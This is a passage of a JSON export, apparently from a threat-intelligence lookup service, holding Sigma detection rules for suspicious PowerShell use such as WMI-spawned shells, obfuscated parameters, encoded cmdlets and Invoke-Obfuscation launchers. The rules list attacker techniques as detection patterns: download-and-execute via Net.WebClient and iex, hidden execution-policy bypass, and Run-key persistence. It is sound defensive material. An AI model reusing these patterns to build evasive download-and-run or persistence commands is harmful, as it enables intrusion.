                            "raw": "author: Markus Neis @Karneades\ndate: 2019/04/03\ndescription: Detects Powershell as a child of the WmiPrvSE process. Which could be\n  a signe of remote access via WMI\ndetection:\n  condition: all of selection* and not 1 of filter_*\n  filter_null_1:\n    CommandLine: 'null'\n  filter_null_2:\n    CommandLine: null\n  selection_img:\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\n  selection_parent:\n    ParentImage|endswith: \\wmiprvse.exe\nfalsepositives:\n- AppvClient\n- CCM\nid: 692f0bec-83ba-4d04-af7e-e884a96059b6\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/19\nreferences:\n- https://any.run/report/68bc255f9b0db6a0d30a8f2dadfbee3256acfe12497bf93943bc1eab0735e45e/a2385d6f-34f7-403c-90d3-b1f9d2a90a5e\nrelated:\n- id: 8a582fe2-0882-4b89-a82a-da6b2dc32937\n  type: similar\n- id: d21374ff-f574-44a7-9998-4a8c8bf33d7d\n  type: similar\nstatus: stable\ntags:\n- attack.execution\n- attack.t1047\n- attack.t1059.001\ntitle: WmiPrvSE Spawned PowerShell\n",
                            "sigma:id": "692f0bec-83ba-4d04-af7e-e884a96059b6",
                            "title": "WmiPrvSE Spawned PowerShell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "36210e0d-5b19-485d-a087-c096088885f0",
                        "lookup_data": {
                            "description": "Detects suspicious PowerShell invocation with a parameter substring",
                            "raw": "author: Florian Roth (Nextron Systems), Daniel Bohannon (idea), Roberto Rodriguez\n  (Fix)\ndate: 2019/01/16\ndescription: Detects suspicious PowerShell invocation with a parameter substring\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains:\n    - ' -windowstyle h '\n    - ' -windowstyl h'\n    - ' -windowsty h'\n    - ' -windowst h'\n    - ' -windows h'\n    - ' -windo h'\n    - ' -wind h'\n    - ' -win h'\n    - ' -wi h'\n    - ' -win h '\n    - ' -win hi '\n    - ' -win hid '\n    - ' -win hidd '\n    - ' -win hidde '\n    - ' -NoPr '\n    - ' -NoPro '\n    - ' -NoProf '\n    - ' -NoProfi '\n    - ' -NoProfil '\n    - ' -nonin '\n    - ' -nonint '\n    - ' -noninte '\n    - ' -noninter '\n    - ' -nonintera '\n    - ' -noninterac '\n    - ' -noninteract '\n    - ' -noninteracti '\n    - ' -noninteractiv '\n    - ' -ec '\n    - ' -encodedComman '\n    - ' -encodedComma '\n    - ' -encodedComm '\n    - ' -encodedCom '\n    - ' -encodedCo '\n    - ' -encodedC '\n    - ' -encoded '\n    - ' -encode '\n    - ' -encod '\n    - ' -enco '\n    - ' -en '\n    - ' -executionpolic '\n    - ' -executionpoli '\n    - ' -executionpol '\n    - ' -executionpo '\n    - ' -executionp '\n    - ' -execution bypass'\n    - ' -executio bypass'\n    - ' -executi bypass'\n    - ' -execut bypass'\n    - ' -execu bypass'\n    - ' -exec bypass'\n    - ' -exe bypass'\n    - ' -ex bypass'\n    - ' -ep bypass'\n    - ' /windowstyle h '\n    - ' /windowstyl h'\n    - ' /windowsty h'\n    - ' /windowst h'\n    - ' /windows h'\n    - ' /windo h'\n    - ' /wind h'\n    - ' /win h'\n    - ' /wi h'\n    - ' /win h '\n    - ' /win hi '\n    - ' /win hid '\n    - ' /win hidd '\n    - ' /win hidde '\n    - ' /NoPr '\n    - ' /NoPro '\n    - ' /NoProf '\n    - ' /NoProfi '\n    - ' /NoProfil '\n    - ' /nonin '\n    - ' /nonint '\n    - ' /noninte '\n    - ' /noninter '\n    - ' /nonintera '\n    - ' /noninterac '\n    - ' /noninteract '\n    - ' /noninteracti '\n    - ' /noninteractiv '\n    - ' /ec '\n    - ' /encodedComman '\n    - ' /encodedComma '\n    - ' /encodedComm '\n    - ' /encodedCom '\n    - ' /encodedCo '\n    - ' /encodedC '\n    - ' /encoded '\n    - ' /encode '\n    - ' /encod '\n    - ' /enco '\n    - ' /en '\n    - ' /executionpolic '\n    - ' /executionpoli '\n    - ' /executionpol '\n    - ' /executionpo '\n    - ' /executionp '\n    - ' /execution bypass'\n    - ' /executio bypass'\n    - ' /executi bypass'\n    - ' /execut bypass'\n    - ' /execu bypass'\n    - ' /exec bypass'\n    - ' /exe bypass'\n    - ' /ex bypass'\n    - ' /ep bypass'\n    Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\nfalsepositives:\n- Unknown\nid: 36210e0d-5b19-485d-a087-c096088885f0\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/07/14\nreferences:\n- http://www.danielbohannon.com/blog-1/2017/3/12/powershell-execution-argument-obfuscation-how-it-can-make-detection-easier\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious PowerShell Parameter Substring\n",
                            "sigma:id": "36210e0d-5b19-485d-a087-c096088885f0",
                            "title": "Suspicious PowerShell Parameter Substring",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "73e733cc-1ace-3212-a107-ff2523cc9fc3",
                        "lookup_data": {
                            "description": "Focuses on trivial artifacts observed in variants of prevalent offensive ps1 payloads, including Cobalt Strike Beacon, PoshC2, Powerview, Letmein, Empire, Powersploit, and other attack payloads that often undergo minimal changes by attackers due to bad opsec.",
                            "raw": "author: ok @securonix invrep_de, oscd.community\ndate: 2020/10/09\ndescription: Focuses on trivial artifacts observed in variants of prevalent offensive\n  ps1 payloads, including Cobalt Strike Beacon, PoshC2, Powerview, Letmein, Empire,\n  Powersploit, and other attack payloads that often undergo minimal changes by attackers\n  due to bad opsec.\ndetection:\n  condition: selection_4104 or selection_4103\n  selection_4103:\n    EventID: 4103\n    Payload|contains:\n    - $DoIt\n    - harmj0y\n    - mattifestation\n    - _RastaMouse\n    - tifkin_\n    - '0xdeadbeef'\n  selection_4104:\n    EventID: 4104\n    ScriptBlockText|contains:\n    - $DoIt\n    - harmj0y\n    - mattifestation\n    - _RastaMouse\n    - tifkin_\n    - '0xdeadbeef'\nfalsepositives:\n- Moderate-to-low; Despite the shorter length/lower entropy for some of these, because\n  of high specificity, fp appears to be fairly limited in many environments.\nid: 73e733cc-1ace-3212-a107-ff2523cc9fc3\nlevel: high\nlogsource:\n  definition: Script block logging must be enabled\n  product: windows\n  service: powershell\nmodified: 2020/10/09\nreferences:\n- https://newtonpaul.com/analysing-fileless-malware-cobalt-strike-beacon/\n- https://labs.sentinelone.com/top-tier-russian-organized-cybercrime-group-unveils-fileless-stealthy-powertrick-backdoor-for-high-value-targets/\n- https://www.mdeditor.tw/pl/pgRt\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.t1086\ntitle: Bad Opsec Powershell Code Artifacts\n",
                            "sigma:id": "73e733cc-1ace-3212-a107-ff2523cc9fc3",
                            "title": "Bad Opsec Powershell Code Artifacts",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c",
                        "lookup_data": {
                            "description": "Detects usage of a base64 encoded \"FromBase64String\" cmdlet in a process command line",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2019/08/24\ndescription: Detects usage of a base64 encoded \"FromBase64String\" cmdlet in a process\n  command line\ndetection:\n  condition: selection\n  selection:\n  - CommandLine|base64offset|contains: ::FromBase64String\n  - CommandLine|contains:\n    - OgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcA\n    - oAOgBGAHIAbwBtAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnA\n    - 6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZw\nfalsepositives:\n- Unknown\nfields:\n- CommandLine\n- ParentCommandLine\nid: fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/31\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1140\n- attack.execution\n- attack.t1059.001\ntitle: PowerShell Base64 Encoded FromBase64String Keyword\n",
                            "sigma:id": "fdb62a13-9a81-4e5c-a38f-ea93a16f6d7c",
                            "title": "PowerShell Base64 Encoded FromBase64String Keyword",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "99b97608-3e21-4bfe-8217-2a127c396a0e",
                        "lookup_data": {
                            "description": "Detects PowerShell remote thread creation in Rundll32.exe",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2018/06/25\ndescription: Detects PowerShell remote thread creation in Rundll32.exe\ndetection:\n  condition: selection\n  selection:\n    SourceImage|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n    TargetImage|endswith: \\rundll32.exe\nfalsepositives:\n- Unknown\nid: 99b97608-3e21-4bfe-8217-2a127c396a0e\nlevel: high\nlogsource:\n  category: create_remote_thread\n  product: windows\nmodified: 2022/07/14\nreferences:\n- https://www.fireeye.com/blog/threat-research/2018/06/bring-your-own-land-novel-red-teaming-technique.html\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1218.011\n- attack.t1059.001\ntitle: PowerShell Rundll32 Remote Thread Creation\n",
                            "sigma:id": "99b97608-3e21-4bfe-8217-2a127c396a0e",
                            "title": "PowerShell Rundll32 Remote Thread Creation",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71",
                        "lookup_data": {
                            "description": "Detects suspicious PowerShell invocation command parameters",
                            "raw": "author: Florian Roth (Nextron Systems), Jonhnathan Ribeiro\ndate: 2017/03/05\ndescription: Detects suspicious PowerShell invocation command parameters\ndetection:\n  condition: 1 of selection_* and not 1 of filter_*\n  filter_chocolatey:\n    ScriptBlockText|contains:\n    - (New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1\n    - (New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1')\n    - Write-ChocolateyWarning\n  selection_convert_b64:\n    ScriptBlockText|contains|all:\n    - -nop\n    - ' -w '\n    - hidden\n    - ' -c '\n    - '[Convert]::FromBase64String'\n  selection_enc_selection:\n    ScriptBlockText|contains|all:\n    - ' -w '\n    - hidden\n    - -ep\n    - bypass\n    - -Enc\n  selection_iex_selection:\n    ScriptBlockText|contains|all:\n    - ' -w '\n    - hidden\n    - -noni\n    - -nop\n    - ' -c '\n    - iex\n    - New-Object\n  selection_iex_webclient:\n    ScriptBlockText|contains|all:\n    - iex\n    - New-Object\n    - Net.WebClient\n    - .Download\n  selection_reg_selection:\n    ScriptBlockText|contains|all:\n    - powershell\n    - reg\n    - add\n    - HKCU\\software\\microsoft\\windows\\currentversion\\run\n  selection_webclient_selection:\n    ScriptBlockText|contains|all:\n    - bypass\n    - -noprofile\n    - -windowstyle\n    - hidden\n    - new-object\n    - system.net.webclient\n    - .download\nfalsepositives:\n- Unknown\nid: ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2023/01/05\nrelated:\n- id: fce5f582-cc00-41e1-941a-c6fabf0fdb8c\n  type: derived\n- id: 8ff28fdd-e2fa-4dfa-aeda-ef3d61c62090\n  type: similar\n- id: 536e2947-3729-478c-9903-745aaffe60d2\n  type: similar\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Suspicious PowerShell Invocations - Specific\n",
                            "sigma:id": "ae7fbf8e-f3cb-49fd-8db4-5f3bed522c71",
                            "title": "Suspicious PowerShell Invocations - Specific",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "761270e6-3a97-4c18-9a44-a844cb5b562b",
                        "lookup_data": {
                            "description": "Chiseling In: Lorenz Ransomware Group Cracks MiVoice And Calls Back For Free",
                            "link": "https://www.circl.lu/doc/misp/feed-osint/761270e6-3a97-4c18-9a44-a844cb5b562b.json",
                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
                            "timestamp": "1666603345",
                            "uuid": "761270e6-3a97-4c18-9a44-a844cb5b562b",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "96cd126d-f970-49c4-848a-da3a09f55c55",
                        "lookup_data": {
                            "description": "Detects Set-Alias or New-Alias cmdlet usage. Which can be use as a mean to obfuscate PowerShell scripts",
                            "raw": "author: frack113\ndate: 2023/01/08\ndescription: Detects Set-Alias or New-Alias cmdlet usage. Which can be use as a mean\n  to obfuscate PowerShell scripts\ndetection:\n  condition: selection\n  selection:\n    ScriptBlockText|contains:\n    - 'Set-Alias '\n    - 'New-Alias '\nfalsepositives:\n- Unknown\nid: 96cd126d-f970-49c4-848a-da3a09f55c55\nlevel: low\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nreferences:\n- https://github.com/1337Rin/Swag-PSO\nrelated:\n- id: e8314f79-564d-4f79-bc13-fbc0bf2660d8\n  type: derived\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.execution\n- attack.t1027\n- attack.t1059.001\ntitle: Potential PowerShell Obfuscation Using Alias Cmdlets\n",
                            "sigma:id": "96cd126d-f970-49c4-848a-da3a09f55c55",
                            "title": "Potential PowerShell Obfuscation Using Alias Cmdlets",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "f4bbd493-b796-416e-bbf2-121235348529",
                        "lookup_data": {
                            "description": "Detects non-interactive PowerShell activity by looking at powershell.exe with a non user process such as \"explorer.exe\" as a parent.",
                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g (rule), oscd.community (improvements)\ndate: 2019/09/12\ndescription: Detects non-interactive PowerShell activity by looking at powershell.exe\n  with a non user process such as \"explorer.exe\" as a parent.\ndetection:\n  condition: selection and not 1 of filter_*\n  filter_generic:\n  - ParentImage|endswith:\n    - \\explorer.exe\n    - \\CompatTelRunner.exe\n  - ParentImage: C:\\$WINDOWS.~BT\\Sources\\SetupHost.exe\n  filter_vscode:\n    ParentCommandLine|contains: ' --ms-enable-electron-run-as-node '\n    ParentImage|endswith: \\AppData\\Local\\Programs\\Microsoft VS Code\\Code.exe\n    ParentImage|startswith: C:\\Users\\\n  selection:\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\nfalsepositives:\n- Legitimate programs executing PowerShell scripts\nid: f4bbd493-b796-416e-bbf2-121235348529\nlevel: low\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/20\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/02_execution/WIN-190410151110.html\nstatus: test\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Non Interactive PowerShell Process Spawned\n",
                            "sigma:id": "f4bbd493-b796-416e-bbf2-121235348529",
                            "title": "Non Interactive PowerShell Process Spawned",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "73e67340-0d25-11eb-adc1-0242ac120002",
                        "lookup_data": {
                            "description": "Detects Obfuscated use of Clip.exe to execute PowerShell",
                            "raw": "author: Jonathan Cheong, oscd.community\ndate: 2020/10/13\ndescription: Detects Obfuscated use of Clip.exe to execute PowerShell\ndetection:\n  condition: selection_4104\n  selection_4104:\n    ScriptBlockText|re: .*cmd.{0,5}(?:/c|/r).+clip(?:\\.exe)?.{0,4}&&.+clipboard]::\\(\\s\\\\\"\\{\\d\\}.+-f.+\"\nfalsepositives:\n- Unknown\nid: 73e67340-0d25-11eb-adc1-0242ac120002\nlevel: high\nlogsource:\n  category: ps_script\n  definition: 'Requirements: Script Block Logging must be enabled'\n  product: windows\nmodified: 2022/12/02\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation CLIP+ Launcher - PowerShell\n",
                            "sigma:id": "73e67340-0d25-11eb-adc1-0242ac120002",
                            "title": "Invoke-Obfuscation CLIP+ Launcher - PowerShell",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "056a7ee1-4853-4e67-86a0-3fd9ceed7555",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via RUNDLL LAUNCHER",
                            "raw": "author: Timur Zinniatullin, oscd.community\ndate: 2020/10/18\ndescription: Detects Obfuscated Powershell via RUNDLL LAUNCHER\ndetection:\n  condition: selection\n  selection:\n    CommandLine|contains|all:\n    - rundll32.exe\n    - shell32.dll\n    - shellexec_rundll\n    - powershell\nfalsepositives:\n- Unknown\nid: 056a7ee1-4853-4e67-86a0-3fd9ceed7555\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/03/07\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation RUNDLL LAUNCHER\n",
                            "sigma:id": "056a7ee1-4853-4e67-86a0-3fd9ceed7555",
                            "title": "Invoke-Obfuscation RUNDLL LAUNCHER",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "846b866e-2a57-46ee-8e16-85fa92759be7",
                        "lookup_data": {
                            "description": "Detects the exploitation of Zoho ManageEngine Desktop Central Java Deserialization vulnerability reported as CVE-2020-10189",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2020/03/25\ndescription: Detects the exploitation of Zoho ManageEngine Desktop Central Java Deserialization\n  vulnerability reported as CVE-2020-10189\ndetection:\n  condition: selection\n  selection:\n    Image|endswith:\n    - \\cmd.exe\n    - \\powershell.exe\n    - \\pwsh.exe\n    - \\bitsadmin.exe\n    - \\systeminfo.exe\n    - \\net.exe\n    - \\net1.exe\n    - \\reg.exe\n    - \\query.exe\n    ParentImage|endswith: DesktopCentral_Server\\jre\\bin\\java.exe\nfalsepositives:\n- Unknown\nid: 846b866e-2a57-46ee-8e16-85fa92759be7\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/21\nreferences:\n- https://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html\n- https://vulmon.com/exploitdetails?qidtp=exploitdb&qid=48224\nstatus: test\ntags:\n- attack.initial_access\n- attack.t1190\n- attack.execution\n- attack.t1059.001\n- attack.t1059.003\n- attack.s0190\n- cve.2020.10189\ntitle: Exploited CVE-2020-10189 Zoho ManageEngine\n",
                            "sigma:id": "846b866e-2a57-46ee-8e16-85fa92759be7",
                            "title": "Exploited CVE-2020-10189 Zoho ManageEngine",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "63e3365d-4824-42d8-8b82-e56810fefa0c",
                        "lookup_data": {
                            "description": "Detects Obfuscated Powershell via use Clip.exe in Scripts",
                            "raw": "author: Nikita Nazarov, oscd.community\ndate: 2020/10/09\ndescription: Detects Obfuscated Powershell via use Clip.exe in Scripts\ndetection:\n  condition: selection\n  selection:\n    EventID: 7045\n    ImagePath|contains: (Clipboard|i\n    Provider_Name: Service Control Manager\nfalsepositives:\n- Unknown\nid: 63e3365d-4824-42d8-8b82-e56810fefa0c\nlevel: high\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation Via Use Clip - System\n",
                            "sigma:id": "63e3365d-4824-42d8-8b82-e56810fefa0c",
                            "title": "Invoke-Obfuscation Via Use Clip - System",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "6c96fc76-0eb1-11eb-adc1-0242ac120002",
                        "lookup_data": {
                            "description": "Detects Obfuscated use of stdin to execute PowerShell",
                            "raw": "author: Jonathan Cheong, oscd.community\ndate: 2020/10/15\ndescription: Detects Obfuscated use of stdin to execute PowerShell\ndetection:\n  condition: all of selection_*\n  selection_main:\n    CommandLine|contains:\n    - /c\n    - /r\n    CommandLine|contains|all:\n    - cmd\n    - powershell\n  selection_other:\n  - CommandLine|contains: noexit\n  - CommandLine|contains|all:\n    - input\n    - $\nfalsepositives:\n- Unknown\nid: 6c96fc76-0eb1-11eb-adc1-0242ac120002\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2022/11/17\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: test\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation STDIN+ Launcher\n",
                            "sigma:id": "6c96fc76-0eb1-11eb-adc1-0242ac120002",
                            "title": "Invoke-Obfuscation STDIN+ Launcher",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "72862bf2-0eb1-11eb-adc1-0242ac120002",
                        "lookup_data": {
                            "description": "Detects Obfuscated use of stdin to execute PowerShell",
                            "raw": "author: Jonathan Cheong, oscd.community\ndate: 2020/10/15\ndescription: Detects Obfuscated use of stdin to execute PowerShell\ndetection:\n  condition: all of selection_*\n  selection_main:\n    EventID: 7045\n    ImagePath|contains:\n    - /c\n    - /r\n    ImagePath|contains|all:\n    - cmd\n    - powershell\n    Provider_Name: Service Control Manager\n  selection_other:\n  - ImagePath|contains: noexit\n  - ImagePath|contains|all:\n    - input\n    - $\nfalsepositives:\n- Unknown\nid: 72862bf2-0eb1-11eb-adc1-0242ac120002\nlevel: high\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/11/29\nreferences:\n- https://github.com/SigmaHQ/sigma/issues/1009\nstatus: experimental\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.execution\n- attack.t1059.001\ntitle: Invoke-Obfuscation STDIN+ Launcher - System\n",
                            "sigma:id": "72862bf2-0eb1-11eb-adc1-0242ac120002",
                            "title": "Invoke-Obfuscation STDIN+ Launcher - System",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "c86133ad-4725-4bd0-8170-210788e0a7ba",
                        "lookup_data": {
                            "description": "Detects PowerShell command line contents that include a suspicious abnormal casing in the Net.Webclient (e.g. nEt.WEbCliEnT) string as used in obfuscation techniques",
                            "raw": "author: Florian Roth (Nextron Systems)\ndate: 2022/05/24\ndescription: Detects PowerShell command line contents that include a suspicious abnormal\n  casing in the Net.Webclient (e.g. nEt.WEbCliEnT) string as used in obfuscation techniques\ndetection:\n  condition: all of selection_*\n  selection_encoded:\n    CommandLine|contains:\n    - TgBlAFQALgB3AEUAQg\n    - 4AZQBUAC4AdwBFAEIA\n    - OAGUAVAAuAHcARQBCA\n    - bgBFAHQALgB3AGUAYg\n    - 4ARQB0AC4AdwBlAGIA\n    - uAEUAdAAuAHcAZQBiA\n    - TgBFAHQALgB3AGUAYg\n    - OAEUAdAAuAHcAZQBiA\n    - bgBlAFQALgB3AGUAYg\n    - 4AZQBUAC4AdwBlAGIA\n    - uAGUAVAAuAHcAZQBiA\n    - TgBlAFQALgB3AGUAYg\n    - OAGUAVAAuAHcAZQBiA\n    - bgBFAFQALgB3AGUAYg\n    - 4ARQBUAC4AdwBlAGIA\n    - uAEUAVAAuAHcAZQBiA\n    - bgBlAHQALgBXAGUAYg\n    - 4AZQB0AC4AVwBlAGIA\n    - uAGUAdAAuAFcAZQBiA\n    - bgBFAHQALgBXAGUAYg\n    - 4ARQB0AC4AVwBlAGIA\n    - uAEUAdAAuAFcAZQBiA\n    - TgBFAHQALgBXAGUAYg\n    - OAEUAdAAuAFcAZQBiA\n    - bgBlAFQALgBXAGUAYg\n    - 4AZQBUAC4AVwBlAGIA\n    - uAGUAVAAuAFcAZQBiA\n    - TgBlAFQALgBXAGUAYg\n    - OAGUAVAAuAFcAZQBiA\n    - bgBFAFQALgBXAGUAYg\n    - 4ARQBUAC4AVwBlAGIA\n    - uAEUAVAAuAFcAZQBiA\n    - bgBlAHQALgB3AEUAYg\n    - 4AZQB0AC4AdwBFAGIA\n    - uAGUAdAAuAHcARQBiA\n    - TgBlAHQALgB3AEUAYg\n    - OAGUAdAAuAHcARQBiA\n    - bgBFAHQALgB3AEUAYg\n    - 4ARQB0AC4AdwBFAGIA\n    - uAEUAdAAuAHcARQBiA\n    - TgBFAHQALgB3AEUAYg\n    - OAEUAdAAuAHcARQBiA\n    - bgBlAFQALgB3AEUAYg\n    - 4AZQBUAC4AdwBFAGIA\n    - uAGUAVAAuAHcARQBiA\n    - TgBlAFQALgB3AEUAYg\n    - OAGUAVAAuAHcARQBiA\n    - bgBFAFQALgB3AEUAYg\n    - 4ARQBUAC4AdwBFAGIA\n    - uAEUAVAAuAHcARQBiA\n    - TgBFAFQALgB3AEUAYg\n    - OAEUAVAAuAHcARQBiA\n    - bgBlAHQALgBXAEUAYg\n    - 4AZQB0AC4AVwBFAGIA\n    - uAGUAdAAuAFcARQBiA\n    - TgBlAHQALgBXAEUAYg\n    - OAGUAdAAuAFcARQBiA\n    - bgBFAHQALgBXAEUAYg\n    - 4ARQB0AC4AVwBFAGIA\n    - uAEUAdAAuAFcARQBiA\n    - TgBFAHQALgBXAEUAYg\n    - OAEUAdAAuAFcARQBiA\n    - bgBlAFQALgBXAEUAYg\n    - 4AZQBUAC4AVwBFAGIA\n    - uAGUAVAAuAFcARQBiA\n    - TgBlAFQALgBXAEUAYg\n    - OAGUAVAAuAFcARQBiA\n    - bgBFAFQALgBXAEUAYg\n    - 4ARQBUAC4AVwBFAGIA\n    - uAEUAVAAuAFcARQBiA\n    - TgBFAFQALgBXAEUAYg\n    - OAEUAVAAuAFcARQBiA\n    - bgBlAHQALgB3AGUAQg\n    - 4AZQB0AC4AdwBlAEIA\n    - uAGUAdAAuAHcAZQBCA\n    - TgBlAHQALgB3AGUAQg\n    - OAGUAdAAuAHcAZQBCA\n    - bgBFAHQALgB3AGUAQg\n    - 4ARQB0AC4AdwBlAEIA\n    - uAEUAdAAuAHcAZQBCA\n    - TgBFAHQALgB3AGUAQg\n    - OAEUAdAAuAHcAZQBCA\n    - bgBlAFQALgB3AGUAQg\n    - 4AZQBUAC4AdwBlAEIA\n    - uAGUAVAAuAHcAZQBCA\n    - TgBlAFQALgB3AGUAQg\n    - OAGUAVAAuAHcAZQBCA\n    - bgBFAFQALgB3AGUAQg\n    - 4ARQBUAC4AdwBlAEIA\n    - uAEUAVAAuAHcAZQBCA\n    - TgBFAFQALgB3AGUAQg\n    - OAEUAVAAuAHcAZQBCA\n    - bgBlAHQALgBXAGUAQg\n    - 4AZQB0AC4AVwBlAEIA\n    - uAGUAdAAuAFcAZQBCA\n    - TgBlAHQALgBXAGUAQg\n    - OAGUAdAAuAFcAZQBCA\n    - bgBFAHQALgBXAGUAQg\n    - 4ARQB0AC4AVwBlAEIA\n    - uAEUAdAAuAFcAZQBCA\n    - TgBFAHQALgBXAGUAQg\n    - OAEUAdAAuAFcAZQBCA\n    - bgBlAFQALgBXAGUAQg\n    - 4AZQBUAC4AVwBlAEIA\n    - uAGUAVAAuAFcAZQBCA\n    - TgBlAFQALgBXAGUAQg\n    - OAGUAVAAuAFcAZQBCA\n    - bgBFAFQALgBXAGUAQg\n    - 4ARQBUAC4AVwBlAEIA\n    - uAEUAVAAuAFcAZQBCA\n    - TgBFAFQALgBXAGUAQg\n    - OAEUAVAAuAFcAZQBCA\n    - bgBlAHQALgB3AEUAQg\n    - 4AZQB0AC4AdwBFAEIA\n    - uAGUAdAAuAHcARQBCA\n    - TgBlAHQALgB3AEUAQg\n    - OAGUAdAAuAHcARQBCA\n    - bgBFAHQALgB3AEUAQg\n    - 4ARQB0AC4AdwBFAEIA\n    - uAEUAdAAuAHcARQBCA\n    - TgBFAHQALgB3AEUAQg\n    - OAEUAdAAuAHcARQBCA\n    - bgBlAFQALgB3AEUAQg\n    - uAGUAVAAuAHcARQBCA\n    - bgBFAFQALgB3AEUAQg\n    - 4ARQBUAC4AdwBFAEIA\n    - uAEUAVAAuAHcARQBCA\n    - TgBFAFQALgB3AEUAQg\n    - OAEUAVAAuAHcARQBCA\n    - TgBlAHQALgBXAEUAQg\n    - 4AZQB0AC4AVwBFAEIA\n    - OAGUAdAAuAFcARQBCA\n    - bgBFAHQALgBXAEUAQg\n    - 4ARQB0AC4AVwBFAEIA\n    - uAEUAdAAuAFcARQBCA\n    - TgBFAHQALgBXAEUAQg\n    - OAEUAdAAuAFcARQBCA\n    - bgBlAFQALgBXAEUAQg\n    - 4AZQBUAC4AVwBFAEIA\n    - uAGUAVAAuAFcARQBCA\n    - TgBlAFQALgBXAEUAQg\n    - OAGUAVAAuAFcARQBCA\n    - bgBFAFQALgBXAEUAQg\n    - 4ARQBUAC4AVwBFAEIA\n    - uAEUAVAAuAFcARQBCA\n  selection_img:\n  - Image|endswith:\n    - \\powershell.exe\n    - \\pwsh.exe\n  - OriginalFileName:\n    - PowerShell.EXE\n    - pwsh.dll\nfalsepositives:\n- Unknown\nid: c86133ad-4725-4bd0-8170-210788e0a7ba\nlevel: high\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2023/01/05\nreferences:\n- https://app.any.run/tasks/b9040c63-c140-479b-ad59-f1bb56ce7a97/\nstatus: experimental\ntags:\n- attack.execution\n- attack.t1059.001\ntitle: Net WebClient Casing Anomalies\n",
                            "sigma:id": "c86133ad-4725-4bd0-8170-210788e0a7ba",
                            "title": "Net WebClient Casing Anomalies",
                            "_cycat_type": "Item"
                        }
                    },
                    {
                        "uuid": "1816994b-42e1-4fb1-afd2-134d88184f71",
                        "lookup_data": {
                            "description": "Detects calls to base64 encoded WMI class such as \"Win32_Shadowcopy\", \"\"...etc.",
